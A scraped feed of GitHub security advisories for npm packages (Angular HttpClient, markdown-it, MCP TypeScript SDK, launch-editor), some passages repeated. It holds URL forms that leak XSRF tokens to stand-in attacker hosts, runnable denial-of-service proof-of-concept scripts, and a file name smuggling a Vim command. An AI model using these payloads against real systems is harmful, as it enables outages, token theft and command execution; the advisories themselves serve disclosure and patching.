title: Security Advisory for JavaScript packages hosted at npmjs.com
description: Security Advisory for JavaScript packages hosted at npmjs.com on GitHub

items.content_html:
An incomplete fix for GHSA-58c5-g7wp-6w37 (CVE-2025-66035) in @angular/common's HTTP Client (HttpClient) allows Cross-Site Request Forgery (XSRF) tokens to be leaked to attacker-controlled cross-origin domains when requests use URLs that exploit parsing discrepancies between regular expressions and the browser's WHATWG URL parser.

Technical Description

To address CVE-2025-66035, xsrfInterceptorFn introduced a regular expression (const ABSOLUTE_URL_REGEX = /^(?:https?:)?\/\//i) to detect and skip absolute and protocol-relative URLs before attaching the X-XSRF-TOKEN header.

However, browsers resolve request URLs passed to fetch() and XMLHttpRequest.open() using the WHATWG URL parser. For http: and https: schemes, the WHATWG URL standard performs several normalizations prior to resolving the authority/origin:

  • Backslashes (\) are treated as forward slashes (/) — e.g., /\evil.example/x, \\evil.example/x, \/evil.example/x, https:\\evil.example/x, https:/\evil.example/x.
  • Leading and trailing C0 control characters and spaces (<= 0x20) are stripped — e.g., ' //evil.example/x', '\0//evil.example/x', '\x1f//evil.example/x'.
  • ASCII tab (\t), newline (\n), and carriage return (\r) characters are removed anywhere in the input — e.g., '/\t/evil.example/x', '/\n/evil.example/x', 'htt\tps://evil.example/x'.

Because these URLs do not match /^(?:https?:)?\/\//i, xsrfInterceptorFn treats them as relative same-origin URLs and attaches the X-XSRF-TOKEN header, while the browser resolves and dispatches the request to the cross-origin host (evil.example).

Note: Angular 21.0.3+ and 22.x replaced the regular expression with a WHATWG new URL(req.url, locationOrigin) origin comparison in #65683 and were already unaffected. However, the 20.3.x LTS branch retained the regular expression until 20.3.34.

Impact

The token leakage bypasses Angular's built-in XSRF protection on affected versions, allowing an attacker to capture the user's valid X-XSRF-TOKEN header if their server permits the request and custom header via CORS. Once obtained, the attacker can perform Cross-Site Request Forgery (CSRF) attacks against the victim user's session.

Attack Preconditions

  1. The victim's Angular application must have XSRF protection enabled (enabled by default in HttpClient).
  2. The attacker must be able to make the application send a state-changing HTTP request (e.g., POST, PUT, DELETE, PATCH) to a URL they control (such as /\attacker.example/api or //attacker.example/api).

Patches

The issue is resolved by parsing and comparing the request URL's origin against the application's current origin using the standard URL constructor (new URL(req.url, locationOrigin)).

  • 21.0.3 (and all 22.x releases)
  • 20.3.34

Workarounds

If you cannot immediately upgrade to a patched version:

  • Validate and normalize outgoing request URLs using new URL(url, window.location.origin) and verify that parsedUrl.origin === window.location.origin before passing dynamic URLs to mutating HttpClient requests.
  • Avoid passing untrusted or user-controlled URLs to HttpClient mutating methods.

References

  • https://github.com/angular/angular/security/advisories/GHSA-jfgx-762w-99vr
  • https://github.com/angular/angular/pull/65683
  • https://github.com/angular/angular/pull/71295
  • https://github.com/angular/angular/commit/0659d11c854c9c6b886a2e925afef98d70bb005f
  • https://github.com/angular/angular/commit/20474d3f0fd7c64071add6e84acf720627e5c19b
  • https://github.com/angular/angular/commit/933ce817d53e25926844fa56af8230816763d08e
  • https://github.com/advisories/GHSA-jfgx-762w-99vr

items.content_html:
Summary

A link reference definition whose label or title is never closed is O(n²) in markdown-it 15.0.2 with default options. Continuation lines are pulled lazily with str += lineContent in src/rules_block/reference.ts, and the subsequent charCodeAt and slice calls flatten the V8 cons-string, copying everything collected so far; this runs before the rule decides the definition is invalid. It is a regression introduced by PR #1004 in 14.0.0: 13.0.2 processed a 313 KB input in 125 ms, while every version since takes about 11 seconds on the same input. At the sizes below, 200 KB takes 3.6 seconds, 400 KB takes 18.1 seconds, and 800 KB takes 74.0 seconds, which is roughly 4–5× per doubling. No options are required to trigger it.

Details

src/rules_block/reference.ts appends continuation lines with str += lineContent at lines 74, 83, 100, 133, and 150, then keeps indexing the accumulated string via str.charCodeAt(pos) in the label and whitespace loops and str.slice(...) in parseLinkTitle. V8 represents += as a cons-string, and the next charCodeAt or slice flattens it, copying everything collected so far, so one definition spanning n lines costs O(n²). Isolation confirms the rule is responsible: block-only parsing with inline disabled is still quadratic, md.disable('reference') makes the same input linear, and the same text without the leading [ is linear. The fix is to track positions in state.src instead of building str, or to collect line slices in an array and parse across them. At minimum, stop scanning the label after 999 characters (CommonMark §6.3) before pulling more lines, and cap title continuation. Add a pathological test with a 100k-line unclosed title and label. Open PR #1215 edits the same file but its label check runs after the label loop, so it does not bound either variant and the fix can land together with that PR.

The observed output from PoC was: unclosed title n=100000 200009 B 3585.5 ms unclosed title n=200000 400009 B 18107.1 ms (5.05x) unclosed title n=400000 800009 B 73954.4 ms (4.08x)

Regression comparison at 313 KB: 13.0.2 → 125 ms, 14.1.0 → 11.4 s, 15.0.0 → 10.6 s, 15.0.2 → 10.7 s.

Proof of concept

How to execute the PoC:

  1. mkdir -p markdown-it-poc && cd markdown-it-poc
  2. npm init -y
  3. npm i markdown-it@15.0.2
  4. node poc_markdown_it.js

PoC below is:

// poc_markdown_it.js
// Requires: npm install markdown-it@15.0.2
const MarkdownIt = require('markdown-it');
const md = new MarkdownIt();

function bench(label, src) {
  const t0 = process.hrtime.bigint();
  md.render(src);
  const t1 = process.hrtime.bigint();
  console.log(
    `${label.padEnd(30)} ${String(src.length).padStart(9)} B ${(Number(t1 - t0) / 1e6).toFixed(1).padStart(9)} ms`
  );
}

// Unclosed title: one reference definition spread over many lines
for (const n of [100000, 200000, 400000]) {
  bench(`unclosed title n=${n}`, '[a]: /u "' + 'x\n'.repeat(n));
}

// Unclosed label
for (const n of [5000, 10000, 20000]) {
  bench(`unclosed label n=${n}`, '[' + 'a\n'.repeat(n));
}

Impact

This is an algorithmic-complexity denial of service (CWE-407). Any server that renders user Markdown with markdown-it is affected with default options, including comments, issues, chat, wikis, docs previews, and LLM chat UIs. A ~400 KB request body blocks the Node.js event loop for about 18 seconds and an ~800 KB body for about 74 seconds. This is the same class and attacker model as GHSA-253c, but it is reachable without any opt-in option, since the affected path is a core block rule.

References

  • https://github.com/markdown-it/markdown-it/security/advisories/GHSA-gfr2-rv44-r23c
  • https://github.com/markdown-it/markdown-it/commit/48fbc465812c440020c663f040ab22deaf8f1eca
  • https://github.com/markdown-it/markdown-it/commit/d99f48839d37af6fd8a2617516c43dab90755503
  • https://github.com/markdown-it/markdown-it/releases/tag/14.3.3
  • https://github.com/markdown-it/markdown-it/releases/tag/15.0.3
  • https://github.com/advisories/GHSA-gfr2-rv44-r23c

items.content_html:
Summary

With html: true, markdown-it takes quadratic time to parse repeated unterminated HTML constructs inside a paragraph. This affects HTML comments (<!--), processing instructions (<?), declarations (<!A), and CDATA sections (<![CDATA[).

An attacker-controlled input of a few hundred kilobytes can block the Node.js event loop for seconds or tens of seconds. The default configuration has HTML disabled, but the commonmark preset enables it.

The issue was reported against the published markdown-it@15.0.2 package on Node.js 20 and reproduced on the current source with Node.js 24.16.0.

Details

src/rules_inline/text.ts treats < as a terminator, causing the inline parser to attempt the HTML rule at successive HTML construct openers.

With HTML enabled, src/rules_inline/html_inline.ts applies an anchored regular expression to the remaining input:

const match = state.src.slice(pos).match(HTML_TAG_RE)

The comment, processing instruction, declaration, and CDATA alternatives in src/common/html_re.ts scan the remaining input for their respective terminators: -->, ?>, >, and ]]>.

When the terminator is absent, matching fails. Parsing eventually reaches the next opener and scans an overlapping suffix again. Repeating this across the paragraph produces quadratic total work. For these inputs, the problem is repeated scanning across separate matches.

The payload must reach inline parsing. Prefixing it with x keeps it inside a paragraph. Starting a line directly with one of these constructs instead invokes HTML block parsing, which does not exhibit the same repeated inline scans for these payloads.

The existing unclosed <!-- test in test/markdown-it/pathological.test.mjs already contains a reproducer:

'</' + '<!--'.repeat(100000)

However, it runs with default options, where HTML is disabled.

A fix should avoid repeated searches for absent terminators across all four affected alternatives, for example by caching failed searches on the inline state. Fixing only the comment alternative leaves the other three cases affected. Regression coverage should exercise all four with html: true.

The original report was submitted by @JarLob. It credits the GitHub Security Lab Taskflow Agent as part of the GitHub Secure Open Source Fund.

Proof of concept

Install the affected package in an empty directory:

npm install markdown-it@15.0.2

Save the following as poc.mjs and run node poc.mjs:

import MarkdownIt from 'markdown-it'
import { performance } from 'node:perf_hooks'

const mdHtml = new MarkdownIt({ html: true })
const mdDefault = new MarkdownIt()
const sizes = [8000, 16000, 32000, 64000]

function measure(md, src) {
  const start = performance.now()
  md.render(src)
  return (performance.now() - start).toFixed(1)
}

const variants = {
  comment: '<!--',
  processing: '<?x',
  declaration: '<!A',
  cdata: '<![CDATA['
}

for (const [name, opener] of Object.entries(variants)) {
  console.log(`\n${name}`)
  for (const n of sizes) {
    const src = 'x ' + opener.repeat(n)
    console.log({
      n,
      bytes: Buffer.byteLength(src),
      ms: measure(mdHtml, src)
    })
  }
}

const n = sizes.at(-1)
const controls = {
  'HTML disabled': [mdDefault, 'x ' + '<!--'.repeat(n)],
  'Closed comments': [mdHtml, 'x ' + '<!---->'.repeat(n)],
  'HTML block': [mdHtml, '<!--'.repeat(n)],
  'Plain text': [mdHtml, 'x ' + 'abcd'.repeat(n)]
}

for (const [name, [md, src]] of Object.entries(controls)) {
  console.log({ control: name, ms: measure(md, src) })
}

const repoPayload = '</' + '<!--'.repeat(100000)
console.log({
  payload: 'Existing pathological test',
  htmlFalseMs: measure(mdDefault, repoPayload),
  htmlTrueMs: measure(mdHtml, repoPayload)
})

Measurements from the original report on markdown-it@15.0.2, Node.js 20:

Construct 8,000 repetitions 64,000 repetitions
Comment 170 ms 8,799 ms
Processing instruction 26 ms 1,566 ms
Declaration 93 ms 5,628 ms
CDATA 119 ms 4,179 ms

An eightfold increase in repetitions produces approximately 35–60 times the execution time, consistent with quadratic growth becoming dominant.

For the comment payload at 64,000 repetitions:

  • HTML disabled: 25 ms.
  • Closed comments: 29 ms.
  • Payload at the start of an HTML block: 1 ms.
  • Plain text: 1 ms.

The existing pathological-test payload with 100,000 comment openers took 33 ms with HTML disabled and 21,030 ms with HTML enabled. A separate comment payload with 128,000 repetitions, approximately 500 KiB, took 32,847 ms.

Exact timings depend on the runtime and hardware.

Impact

This is an availability issue affecting applications that render attacker-controlled Markdown with html: true, including applications using the commonmark preset.

On Node.js, a synchronous render() call can occupy a CPU core and block the event loop for seconds or tens of seconds, delaying other requests handled by the same process. Repeated submissions can cause denial of service. Browser applications can similarly become unresponsive when rendering on the main thread.

Sanitizing the generated HTML afterwards does not prevent the issue because the expensive processing occurs during Markdown rendering.

The default configuration, with HTML disabled, is unaffected by these payloads. Disabling HTML or limiting input size can reduce exposure while a fix is prepared.

The reported affected release is 15.0.2; the full affected version range has not been established.

References

  • https://github.com/markdown-it/markdown-it/security/advisories/GHSA-vfgh-jcmw-g37q
  • https://nvd.nist.gov/vuln/detail/CVE-2026-111766
  • https://github.com/markdown-it/markdown-it/commit/928bc8c11ded60181c0e7fc5aa954eec582e8e79
  • https://github.com/markdown-it/markdown-it/commit/d99f48839d37af6fd8a2617516c43dab90755503
  • https://github.com/markdown-it/markdown-it/releases/tag/14.3.3
  • https://github.com/markdown-it/markdown-it/releases/tag/15.0.3
  • https://github.com/advisories/GHSA-vfgh-jcmw-g37q

The payload must reach inline parsing. Prefixing it with x keeps it inside a paragraph. Starting a line directly with one of these constructs instead invokes HTML block parsing, which does not exhibit the same repeated inline scans for these payloads.

The existing unclosed <!-- test in test/markdown-it/pathological.test.mjs already contains a reproducer:

'</' + '<!--'.repeat(100000)

However, it runs with default options, where HTML is disabled.

A fix should avoid repeated searches for absent terminators across all four affected alternatives, for example by caching failed searches on the inline state. Fixing only the comment alternative leaves the other three cases affected. Regression coverage should exercise all four with html: true.

The original report was submitted by @JarLob. It credits the GitHub Security Lab Taskflow Agent as part of the GitHub Secure Open Source Fund.

Proof of concept

Install the affected package in an empty directory:

npm install markdown-it@15.0.2

Save the following as poc.mjs and run node poc.mjs:

import MarkdownIt from 'markdown-it'
import { performance } from 'node:perf_hooks'

const mdHtml = new MarkdownIt({ html: true })
const mdDefault = new MarkdownIt()
const sizes = [8000, 16000, 32000, 64000]

function measure(md, src) {
  const start = performance.now()
  md.render(src)
  return (performance.now() - start).toFixed(1)
}

const variants = {
  comment: '<!--',
  processing: '<?x',
  declaration: '<!A',
  cdata: '<![CDATA['
}

for (const [name, opener] of Object.entries(variants)) {
  console.log(`\n${name}`)
  for (const n of sizes) {
    const src = 'x ' + opener.repeat(n)
    console.log({
      n,
      bytes: Buffer.byteLength(src),
      ms: measure(mdHtml, src)
    })
  }
}

const n = sizes.at(-1)
const controls = {
  'HTML disabled': [mdDefault, 'x ' + '<!--'.repeat(n)],
  'Closed comments': [mdHtml, 'x ' + '<!---->'.repeat(n)],
  'HTML block': [mdHtml, '<!--'.repeat(n)],
  'Plain text': [mdHtml, 'x ' + 'abcd'.repeat(n)]
}

for (const [name, [md, src]] of Object.entries(controls)) {
  console.log({ control: name, ms: measure(md, src) })
}

const repoPayload = '</' + '<!--'.repeat(100000)
console.log({
  payload: 'Existing pathological test',
  htmlFalseMs: measure(mdDefault, repoPayload),
  htmlTrueMs: measure(mdHtml, repoPayload)
})

Measurements from the original report on markdown-it@15.0.2, Node.js 20:

Construct 8,000 repetitions 64,000 repetitions
Comment 170 ms 8,799 ms
Processing instruction 26 ms 1,566 ms
Declaration 93 ms 5,628 ms
CDATA 119 ms 4,179 ms

An eightfold increase in repetitions produces approximately 35–60 times the execution time, consistent with quadratic growth becoming dominant.

For the comment payload at 64,000 repetitions:

  • HTML disabled: 25 ms.
  • Closed comments: 29 ms.
  • Payload at the start of an HTML block: 1 ms.
  • Plain text: 1 ms.

The existing pathological-test payload with 100,000 comment openers took 33 ms with HTML disabled and 21,030 ms with HTML enabled. A separate comment payload with 128,000 repetitions, approximately 500 KiB, took 32,847 ms.

Exact timings depend on the runtime and hardware.

Impact

This is an availability issue affecting applications that render attacker-controlled Markdown with html: true, including applications using the commonmark preset.

On Node.js, a synchronous render() call can occupy a CPU core and block the event loop for seconds or tens of seconds, delaying other requests handled by the same process. Repeated submissions can cause denial of service. Browser applications can similarly become unresponsive when rendering on the main thread.

Sanitizing the generated HTML afterwards does not prevent the issue because the expensive processing occurs during Markdown rendering.

The default configuration, with HTML disabled, is unaffected by these payloads. Disabling HTML or limiting input size can reduce exposure while a fix is prepared.

The reported affected release is 15.0.2; the full affected version range has not been established.

items.content_html:
Summary

In affected versions, an MCP server reached over HTTP could deliver one client's responses and notifications to another client. This happened when clients shared one stateless transport, or one McpServer or Server instance.

Messages were matched to a connection by JSON-RPC id alone. SDK clients number requests from 0, so ids collide in normal use.

Am I affected?

Yes, if more than one client can reach your HTTP endpoint and your code creates the transport or the server once at startup, instead of once per request or per session. Until this release, the README examples of @modelcontextprotocol/hono, express, fastify and node showed that pattern.

Affected versions: @modelcontextprotocol/server 2.0.0 through 2.2.0.

Not affected:

  • createMcpHandler() with a factory that builds a new server on every call
  • stdio servers
  • @modelcontextprotocol/sdk 1.26.0 and later

Fix

Upgrade to @modelcontextprotocol/server 2.3.0 or later.

You also need to change your code. The SDK now refuses to be shared, so an affected app fails requests after upgrading: a second connect() rejects with ALREADY_CONNECTED, and a stateless transport rejects its second request.

Change to one of these:

  • createMcpHandler(): pass a factory that builds a new McpServer on every call.
  • Per request: build a new McpServer and a new transport inside the request handler.
  • Per session: set sessionIdGenerator and keep one McpServer and one transport per session.

If you cannot upgrade yet, the same change fixes affected versions.

References

  • https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-jm63-cq47-j5jp
  • https://github.com/modelcontextprotocol/typescript-sdk/pull/2918
  • https://github.com/modelcontextprotocol/typescript-sdk/commit/84804c22e45a662675a198f853b7f00063838a8d
  • https://github.com/advisories/GHSA-jm63-cq47-j5jp

items.content_html:
Summary

In affected versions, servers put no limit on how many array elements and object keys they validated in one request. One HTTP request within the default 4 MiB size limit could exhaust the server's memory, and the process aborted with JavaScript heap out of memory.

No credentials are needed, unless you authenticate requests before they reach the SDK.

Am I affected?

Yes, if clients you do not fully trust can reach your server over HTTP. The risk is highest for McpServer tools whose input contains an array or a record. stdio-only servers are not affected.

Affected versions:

  • @modelcontextprotocol/sdk 1.3.0 through 1.31.0
  • @modelcontextprotocol/server 2.0.0 through 2.2.0

Fix

Upgrade to:

  • 1.x: @modelcontextprotocol/sdk 1.32.0 or later
  • 2.x: @modelcontextprotocol/server 2.3.0 or later

Upgrading alone changes nothing. The patched versions add an McpServer option, maxToolInputElements, that is off by default. Make both of these changes:

  1. Set maxToolInputElements just above the largest input your tools need, for example new McpServer(info, { maxToolInputElements: 10_000 }). It counts array elements and object keys in a call's arguments. A call over the limit gets an isError: true result.
  2. Lower the request size limit to what your tools need. The option covers tool arguments only, and the size limit covers everything else. Set maxRequestBodySize on the transport or createMcpHandler(). If you parse the body yourself, for example with express.json() or Fastify, set that parser's limit.

If you cannot upgrade yet, make the second change. maxRequestBodySize needs @modelcontextprotocol/sdk 1.30.1 or @modelcontextprotocol/server 2.1.0. Below that, use a reverse proxy.

References

  • https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-46jr-4wx8-v453
  • https://github.com/modelcontextprotocol/typescript-sdk/pull/2926
  • https://github.com/modelcontextprotocol/typescript-sdk/pull/2927
  • https://github.com/modelcontextprotocol/typescript-sdk/commit/6d8dbc6cb590edf766fcb66b636ca6b654e99c37

items.content_html:
Summary

launch-editor forwarded file paths directly to editors without sanitization. If a path resembles a CLI flag, editors like Vim may interpret it as a command, potentially causing unintended file overwrites or command execution.

Impact

Direct launch-editor users

Only apps that match all of the following conditions are affected:

  • The attacker is able to create a file system entry (e.g. a file or directory) starting with + or - in the working directory
  • The user uses or the app specifies any of the following editors:
    • Vim (including gVim)
    • MacVim
    • Emacs (including Emacsclient)
    • Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)
  • The first argument of launchEditor can start with + or - or the user is using WSL

launch-editor-middleware users

Only apps that match the following conditions are affected:

  • The attacker is able to create a file system entry (e.g. a file or directory) starting with + or - in the working directory
  • The user uses or the app specifies any of the following editors:
    • Vim (including gVim)
    • MacVim
    • Emacs (including Emacsclient)
    • Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)
  • launch-editor older than v2.2.0 is used, or the user is using WSL

Vite users

Only apps that match the following conditions are affected:

  • The attacker is able to create a file system entry (e.g. a file or directory) starting with + or - in the working directory
  • The user uses or the app specifies any of the following editors:
    • Vim (including gVim)
    • MacVim
    • Emacs (including Emacsclient)
    • Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)
  • The user is using WSL

Details

launchEditor(file) function passes the file name as-is to the editor if the file with that file name exists. If the file name starts with - (also + for Vim), the editor treats them as flags rather than positional arguments. For example, Vim treats arguments starting with + as an Ex command. As a result, an existing relative directory such as:

+call writefile(["SAFE_MARKER"],"LAUNCH_EDITOR_MARKER")|qa!

is not treated as a filename when passed to Vim. Vim executes the embedded Ex command.

The following editor has a potentially destructive operation exposed to the CLI arguments:

  • Vim (including gVim)
  • MacVim
  • Emacs (including Emacsclient)
  • Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)

launch-editor-middleware v2.2.0+ converts the passed file path to an absolute path so those are not affected as long as the user is not using WSL. For WSL, launch-editor converts the paths to relative paths internally, so those are still affected.

Vite 2.0.0+ uses launch-editor-middleware v2.2.0+ so the WSL users are only affected.

References

  • https://github.com/vitejs/launch-editor/security/advisories/GHSA-r825-w8mm-5pxw
  • https://nvd.nist.gov/vuln/detail/CVE-2026-112944
  • https://github.com/vitejs/launch-editor/pull/156
  • https://github.com/vitejs/launch-editor/commit/f6e6701bb1f16f2dd242b321374f1b6cca6eb6d4
  • https://github.com/vitejs/launch-editor/releases/tag/v2.14.2
  • https://github.com/advisories/GHSA-r825-w8mm-5pxw

  • The attacker is able to create a file system entry (e.g. a file or directory) starting with + or - in the working directory

    • Vim (including gVim)
    • MacVim
    • Emacs (including Emacsclient)
    • Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)
  • The first argument of launchEditor can start with + or - or the user is using WSL

launch-editor-middleware users

Only apps that match the following conditions are affected:

  • The attacker is able to create a file system entry (e.g. a file or directory) starting with + or - in the working directory
  • The user uses or the app specifies any of the following editors:
    • Vim (including gVim)

    • MacVim
    • Emacs (including Emacsclient)

items.title: [launch-editor] launch-editor: Editor CLI flag misinterpretation causing arbitrary command execution for some editors

items.content_html:
Summary

launch-editor checked fs.existsSync(fileName) before passing a supplied path to an editor command. On Windows, an attacker can bypass this check with a crafted path ending in \\..:line:column. This removes the requirement that the attacker be able to place a file with a malicious filename.

Combined with the % escaping issue described in GHSA-698v-4r3x-3vcv, this bypass can lead to OS command injection when an attacker controls the file argument.

Impact

Only apps that runs on Windows is affected.

Details

The earlier advisory assumed that fs.existsSync() required an attacker-controlled filename to exist. This advisory covers a bypass of that requirement.

A crafted value ending in \\..:1:1 is interpreted differently by launch-editor-middleware, launch-editor, and Windows:

  1. launch-editor-middleware calls path.resolve() while the final path component is ..:1:1, so it is not treated as a parent-directory component.
  2. launch-editor treats :1:1 as a line-and-column suffix and removes it, leaving a path ending in \\...
  3. On Windows, fs.existsSync() accepts the resulting path as the existing parent directory even though the attacker-controlled preceding component does not exist.
  4. Because the existence check passes, the crafted filename reaches the Windows shell command.

References

  • https://github.com/vitejs/launch-editor/security/advisories/GHSA-587h-7wmj-h5pm
  • https://nvd.nist.gov/vuln/detail/CVE-2026-112942
  • https://github.com/vitejs/launch-editor/commit/f13cd835d4b8e860b1d4d080ad8a490cc2463679
  • https://github.com/vitejs/launch-editor/releases/tag/v2.14.2
  • https://github.com/advisories/GHSA-587h-7wmj-h5pm
